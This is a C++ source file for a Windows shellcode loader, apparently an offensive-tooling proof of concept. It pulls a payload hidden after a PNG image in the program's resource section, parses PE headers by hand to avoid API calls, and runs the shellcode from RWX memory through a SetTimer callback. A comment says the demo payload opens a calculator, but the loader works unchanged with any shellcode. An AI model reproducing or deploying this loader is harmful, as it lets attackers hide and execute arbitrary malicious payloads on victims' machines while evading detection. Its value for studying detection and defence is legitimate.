// Payload-extractor-from-resource.cpp
// By WafflesExploits

#define _CRT_SECURE_NO_WARNINGS // Avoid warning messages for fopen
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "resource.h"

// Modify the following variables below:
#define ORIGINAL_FILE_SIZE 6594 // Replace with the actual original file size
#define PAYLOAD_RESOURCE_ID IDB_PNG1 // Find this value in resource.h
#define PAYLOAD_RESOURCE_TYPE L"PNG" // Find this value in Resource.rc. Search by your resource_id.



// This function was based on the code from https://github.com/NUL0x4C/AtomLdr
/**
 * @brief Retrieves the handle of the current module by walking backward through memory.
 *
 * @param pLocalFunction Pointer to a function (e.g., main) within the current module.
 * @return HMODULE Handle to the current module, or NULL if it cannot be found.
 */
HMODULE hGetCurrentModuleHandle(PVOID pLocalFunction) {
    ULONG_PTR uFunctionPntr = (ULONG_PTR)pLocalFunction;
    PIMAGE_DOS_HEADER pImgDosHdr = NULL;
    PIMAGE_NT_HEADERS pImgNtHdrs = NULL;

    // Walk backward through memory to find the DOS and PE headers
    do {
        pImgDosHdr = (PIMAGE_DOS_HEADER)uFunctionPntr;

        // Check for the DOS header signature
        if (pImgDosHdr->e_magic == IMAGE_DOS_SIGNATURE) {
            // Locate the PE headers
            pImgNtHdrs = (PIMAGE_NT_HEADERS)(uFunctionPntr + pImgDosHdr->e_lfanew);

            // Check for the PE header signature and optional header magic
            if (pImgNtHdrs->Signature == IMAGE_NT_SIGNATURE && (pImgNtHdrs->OptionalHeader.Magic & IMAGE_NT_OPTIONAL_HDR64_MAGIC))
                return (HMODULE)uFunctionPntr; // Return the base address of the module
        }

        uFunctionPntr--; // Move backward in memory
    } while (1);

    return NULL; // Return NULL if module handle is not found
}

// This function was based on the code from https://github.com/NUL0x4C/AtomLdr
/**
 * @brief Fetches raw data and size for a specified resource from the current module.
 *
 * @param hModule Handle to the module containing the resource.
 * @param ResourceId ID of the resource to fetch.
 * @param ppResourceRawData Pointer to a pointer where the raw resource data will be stored.
 * @param psResourceDataSize Pointer to a DWORD where the resource data size will be stored.
 * @return BOOL TRUE if the resource data is successfully fetched, FALSE otherwise.
 */
BOOL GetResourceData(HMODULE hModule, WORD ResourceId, PVOID* ppResourceRawData, PDWORD psResourceDataSize) {
    CHAR* pBaseAddr = (CHAR*)hModule;

    // Parse the DOS header to locate the PE headers
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBaseAddr;
    PIMAGE_NT_HEADERS pImgNTHdr = (PIMAGE_NT_HEADERS)(pBaseAddr + pImgDosHdr->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pImgOptionalHdr = (PIMAGE_OPTIONAL_HEADER)&pImgNTHdr->OptionalHeader;

    // Locate the resource directory from the PE optional header
    PIMAGE_DATA_DIRECTORY pDataDir = &pImgOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];
    PIMAGE_RESOURCE_DIRECTORY pResourceDir = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress);
    PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir + 1);

    // Iterate through the resource directory entries
    for (size_t i = 0; i < (pResourceDir->NumberOfNamedEntries + pResourceDir->NumberOfIdEntries); i++) {
        if (pResourceEntry[i].DataIsDirectory == 0)
            break;

        // Locate the second-level resource directory
        PIMAGE_RESOURCE_DIRECTORY pResourceDir2 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry[i].OffsetToDirectory & 0x7FFFFFFF));
        PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry2 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir2 + 1);

        // Check if the second-level entry matches the requested resource ID
        if (pResourceEntry2->DataIsDirectory == 1 && pResourceEntry2->Id == ResourceId) {
            // Locate the third-level resource directory
            PIMAGE_RESOURCE_DIRECTORY pResourceDir3 = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry2->OffsetToDirectory & 0x7FFFFFFF));
            PIMAGE_RESOURCE_DIRECTORY_ENTRY pResourceEntry3 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir3 + 1);

            // Retrieve the resource data entry
            PIMAGE_RESOURCE_DATA_ENTRY pResource = (PIMAGE_RESOURCE_DATA_ENTRY)(pBaseAddr + pDataDir->VirtualAddress + (pResourceEntry3->OffsetToData & 0x7FFFFFFF));

            // Store the raw resource data and its size
            *ppResourceRawData = (PVOID)(pBaseAddr + pResource->OffsetToData);
            *psResourceDataSize = pResource->Size;

            return TRUE;
        }
    }

    return FALSE;
}

/**
 * @brief Extracts the hidden payload from the resource section using PEB parsing without relying
 * on WinAPI functions, treating the resource data as a combined file (original + payload).
 *
 * @param resourceID The resource identifier (e.g., IDB_PNG1).
 * @param resourceType The resource type (e.g., PNG).
 * @param pPayload Pointer to an unsigned char* where the extracted payload will be stored.
 * @param pPayload_size Pointer to a size_t where the payload size will be stored.
 * @param original_size The size of the original file in bytes.
 * @param hModule Handle to the current module containing the resource.
 * @return BOOL TRUE if extraction is successful, FALSE otherwise.
 */
BOOL extract_payload_from_resource_via_peb(WORD resourceID, LPCWSTR resourceType, unsigned char** pPayload, size_t* pPayload_size, long int original_size, HMODULE hModule) {
    PVOID pResourceRawData = NULL;
    DWORD dwResourceDataSize = 0;


    printf("[#] Fetching Image from .rsrc section via PEB...\n");
    // Fetch the resource data using the manual method
    if (!GetResourceData(hModule, resourceID, &pResourceRawData, &dwResourceDataSize)) {
        printf("Error: Failed to fetch resource data.\n");
        return FALSE;
    }

    // Calculate the payload size
    long int payload_size = (long int)dwResourceDataSize - original_size;
    if (payload_size <= 0) {
        printf("Error: No payload data found after the original file.\n");
        return FALSE;
    }

    printf("[i] Payload size to extract from resources: %ld bytes\n", payload_size);

    // Allocate memory for the payload
    unsigned char* Payload = (unsigned char*)malloc(payload_size);
    if (Payload == NULL) {
        printf("Error: Unable to allocate memory for payload.\n");
        return FALSE;
    }

    // Copy the payload data starting from original_size offset
    memcpy(Payload, (unsigned char*)pResourceRawData + original_size, payload_size);

    *pPayload = Payload;
    *pPayload_size = (size_t)payload_size;
    return TRUE;
}


/**
 * @brief Executes payload via SetTimer Callback function.
 *
 * @param Payload Pointer to where payload is stored.
 * @param sPayloadSize Size of Payload.
 * @return BOOL TRUE if successful, FALSE otherwise.
 */
BOOL ExecutePayloadViaCallback(unsigned char* Payload, size_t sPayloadSize) {
    // Allocate memory for payload with VirtualAlloc
    LPVOID pShellcodeAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);
    printf("[#] Writing Payload ... \n");

    // Copy the payload into the allocated memory
    memcpy(pShellcodeAddress, Payload, sPayloadSize);

    // Free the original payload buffer since it's no longer needed
    free(Payload);

    printf("[#] Executing payload ... \n");

    // Execute the payload by setting it as the callback for a timer
    UINT_PTR dummy = 0;
    MSG msg;

    SetTimer(NULL, dummy, NULL, (TIMERPROC)pShellcodeAddress);
    GetMessageW(&msg, NULL, 0, 0);
    DispatchMessageW(&msg);

    // Free the allocated memory after executing the payload
    VirtualFree(pShellcodeAddress, sPayloadSize, MEM_RELEASE);

    return TRUE;
}

int main() {
    unsigned char* Payload = NULL;
    size_t sPayloadSize = 0;
    long int OriginalFileSize = ORIGINAL_FILE_SIZE;

    printf("[#] Fetching Current Module's Handle...\n");
    // Use hGetCurrentModuleHandle to get the handle of the current module by parsing the PEB and PE headers
    HMODULE hModule = hGetCurrentModuleHandle(&main);
    if (hModule == NULL) {
        printf("Error: Unable to get the current module handle.\n");
        return FALSE;
    }

    // Extract the payload from the resource section, treating the resource data
    // as a combined file: original file + appended payload.
    if (!extract_payload_from_resource_via_peb(PAYLOAD_RESOURCE_ID, PAYLOAD_RESOURCE_TYPE, &Payload, &sPayloadSize, OriginalFileSize, hModule)) {
        printf("[!] Payload extraction from resource failed.\n");
        return EXIT_FAILURE;
    }
    
    // The combined_file.png's shellcode opens a calculator

    // Execute the payload via callback
    if (!ExecutePayloadViaCallback(Payload, sPayloadSize)) {
        printf("[!] ExecutePayloadViaCallback failed.\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}
